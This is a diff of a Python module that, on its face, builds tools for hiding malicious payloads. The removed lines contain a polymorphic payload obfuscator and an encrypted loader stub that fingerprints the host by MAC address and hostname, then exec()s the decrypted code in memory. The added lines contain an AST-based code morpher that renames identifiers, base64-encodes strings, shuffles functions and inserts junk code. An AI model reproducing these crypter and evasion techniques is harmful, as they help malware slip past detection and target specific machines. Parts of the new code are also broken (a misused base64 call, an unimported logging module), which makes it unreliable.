@@ -1,133 +1,95 @@
 import random
 import string
+import ast
+import base64
 
-def generate_random_string(length=8):
-    """Generates a random alphanumeric string."""
-    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
+def generate_random_name(length=8):
+    """Generates a random alphanumeric name."""
+    return ''.join(random.choices(string.ascii_letters, k=length))
 
-def insert_junk_code(code_lines):
-    """Inserts meaningless junk code into a list of code lines."""
-    new_lines = []
-    for line in code_lines:
-        new_lines.append(line)
-        if random.random() < 0.3: # 30% chance to insert junk
-            junk_var = generate_random_string()
-            junk_val = random.randint(100, 1000)
-            new_lines.append(f"    {junk_var} = {junk_val} * {random.randint(1,10)}")
-    return new_lines
-
-def obfuscate_variables(code, variables):
-    """Replaces variable names with random strings."""
-    mapping = {var: generate_random_string() for var in variables}
-    for old_name, new_name in mapping.items():
-        code = code.replace(old_name, new_name)
-    return code
-
-def reorder_functions(functions):
-    """Randomly reorders a list of function definitions."""
-    random.shuffle(functions)
-    return functions
-
-def substitute_instructions(code):
+class CodeTransformer(ast.NodeTransformer):
     """
-    Substitutes common instructions with equivalent, but less common ones.
-    (This is a simplified example using string replacement.)
+    AST transformer to rename variables, functions, and obfuscate strings.
     """
-    substitutions = {
-        "x = x + 1": ["x += 1", "x -= -1"],
-        "y = y * 2": ["y = y << 1", "y += y"],
-    }
-    for original, replacements in substitutions.items():
-        if original in code:
-            code = code.replace(original, random.choice(replacements))
-    return code
+    def __init__(self):
+        self.name_map = {}
+        self.obfuscated_strings = {}
 
-def create_polymorphic_payload(base_payload_code):
+    def visit_Name(self, node):
+        if isinstance(node.ctx, (ast.Store, ast.Load)):
+            if node.id not in self.name_map:
+                self.name_map[node.id] = generate_random_name()
+            node.id = self.name_map[node.id]
+        return node
+
+    def visit_FunctionDef(self, node):
+        if node.name not in self.name_map:
+            self.name_map[node.name] = generate_random_name()
+        node.name = self.name_map[node.name]
+        self.generic_visit(node)
+        return node
+
+    def visit_Constant(self, node):
+        if isinstance(node.value, str):
+            if node.value not in self.obfuscated_strings:
+                encoded_string = base64.b64encode(node.value.encode()).decode()
+                self.obfuscated_strings[node.value] = encoded_string
+
+            # Replace the string with a decoding expression
+            b64_name = self.obfuscated_strings[node.value]
+            new_node = ast.Call(
+                func=ast.Attribute(
+                    value=ast.Call(
+                        func=ast.Name(id='base64', ctx=ast.Load()),
+                        args=[ast.Constant(value=b64_name)],
+                        keywords=[]
+                    ),
+                    attr='decode',
+                    ctx=ast.Load()
+                ),
+                args=[],
+                keywords=[]
+            )
+            ast.copy_location(new_node, node)
+            return new_node
+        return node
+
+def morph_code(source_code):
     """
-    Applies various obfuscation techniques to a base payload.
+    Applies polymorphic transformations to a Python script.
     """
-    # 1. Obfuscate variable names
-    variables_to_obfuscate = ["my_socket", "data_to_send"] # Example
-    obfuscated_code = obfuscate_variables(base_payload_code, variables_to_obfuscate)
-
-    # 2. Substitute instructions
-    obfuscated_code = substitute_instructions(obfuscated_code)
-
-    # 3. Insert junk code
-    lines = obfuscated_code.split('\n')
-    lines_with_junk = insert_junk_code(lines)
-
-    # 4. Reorder functions (conceptual)
-    # This would require parsing the code into an AST to do safely.
-
-    final_code = "\n".join(lines_with_junk)
-    return final_code
-
-from cryptography.fernet import Fernet
-
-def generate_encryption_stub(payload, ekp_key=None):
-    """
-    Generates a dynamic Python script that contains an encrypted payload
-    and a decryption stub. Can be environment-keyed.
-    """
-    key = ekp_key or Fernet.generate_key()
-    fernet = Fernet(key)
-    encrypted_payload = fernet.encrypt(payload)
-
-    # Generate random names for variables
-    key_var = generate_random_string()
-    encrypted_var = generate_random_string()
-    # ... and so on
-
-    if ekp_key:
-        # If an EKP key is used, the stub needs to derive the key at runtime
-        stub = f"""
-# EKP-enabled stub
-import platform, subprocess, json, hashlib, base64, uuid
-from cryptography.fernet import Fernet
-
-def get_current_profile_key():
-    # This logic must match the profiler.py script
     try:
-        mac = ':'.join(['{{:02x}}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
-        hostname = platform.node()
-        # ... other profile elements
-        key_material = str(mac) + str(hostname) # Simplified for demo
-        hashed = hashlib.sha256(key_material.encode()).digest()
-        return base64.urlsafe_b64encode(hashed)
-    except Exception:
-        return None
+        # 1. Parse the code into an AST
+        tree = ast.parse(source_code)
 
-encrypted_payload = {encrypted_payload}
-derived_key = get_current_profile_key()
+        # 2. Rename variables and functions, and obfuscate strings
+        transformer = CodeTransformer()
+        new_tree = transformer.visit(tree)
+        ast.fix_missing_locations(new_tree)
 
-if derived_key:
-    try:
-        f = Fernet(derived_key)
-        decrypted_payload = f.decrypt(encrypted_payload)
-        exec(decrypted_payload)
-    except Exception:
-        pass # Key is wrong, payload remains inert
-"""
-    else:
-        # Standard, non-keyed stub
-        stub = f"""
-# Standard stub with reflective loading
-from cryptography.fernet import Fernet
-import sys
+        # 3. Add necessary imports for obfuscated strings
+        new_tree.body.insert(0, ast.Import(names=[ast.alias(name='base64', asname=None)]))
+        ast.fix_missing_locations(new_tree)
 
-key = {key}
-encrypted_payload = {encrypted_payload}
+        # 4. Scramble the order of top-level functions and classes
+        top_level_nodes = [n for n in new_tree.body if isinstance(n, (ast.FunctionDef, ast.ClassDef))]
+        other_nodes = [n for n in new_tree.body if not isinstance(n, (ast.FunctionDef, ast.ClassDef))]
+        random.shuffle(top_level_nodes)
+        new_tree.body = other_nodes + top_level_nodes
 
-def reflective_exec(code):
-    # A simple in-memory execution
-    exec(code, globals())
+        # 5. Insert junk code (simple version)
+        for node in new_tree.body:
+            if isinstance(node, (ast.FunctionDef, ast.ClassDef)):
+                junk_var = generate_random_name()
+                junk_val = random.randint(1000, 9999)
+                junk_node = ast.Assign(targets=[ast.Name(id=junk_var, ctx=ast.Store())], value=ast.Constant(value=junk_val))
+                node.body.insert(0, junk_node)
 
-try:
-    f = Fernet(key)
-    decrypted_payload = f.decrypt(encrypted_payload)
-    reflective_exec(decrypted_payload)
-except Exception:
-    pass
-"""
-    return stub
+        # 6. Unparse the AST back into code
+        morphed_code = ast.unparse(new_tree)
+
+        return morphed_code
+
+    except Exception as e:
+        logging.error(f"Failed to morph code: {e}")
+        return source_code # Return original on failure
